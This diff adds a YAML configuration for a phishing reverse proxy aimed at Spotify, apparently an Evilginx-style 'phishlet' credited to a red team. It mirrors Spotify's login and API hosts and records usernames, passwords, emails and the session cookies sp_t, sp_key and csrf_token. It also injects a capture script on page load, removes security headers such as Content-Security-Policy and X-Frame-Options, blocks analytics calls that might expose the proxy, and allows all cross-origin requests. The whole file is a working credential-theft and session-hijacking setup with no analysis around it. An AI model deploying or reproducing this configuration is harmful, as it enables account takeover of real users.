@@ -1,0 +1,39 @@
+name: "Spotify"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "accounts"
+    target: "accounts.spotify.com"
+  - subdomain: "api"
+    target: "api.spotify.com"
+auth_urls: 
+  - "/login"
+  - "/authorize"
+landing_path: ["/login"]
+auth_tokens:
+  - {type: "cookie", name: "sp_t"}
+  - {type: "cookie", name: "sp_key"}
+  - {type: "cookie", name: "csrf_token"}
+credentials:
+  - {type: "post_param", name: "username", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "email", regex: "^[^@]+@[^@]+\\.[^@]+$"}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Feature-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "spotify-analytics|/log/|/event/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*='login']", action_to: "/login"}
+bridges:
+  - {prefix: "/api/", target_host: "api.spotify.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS"]
+  headers: ["*"]
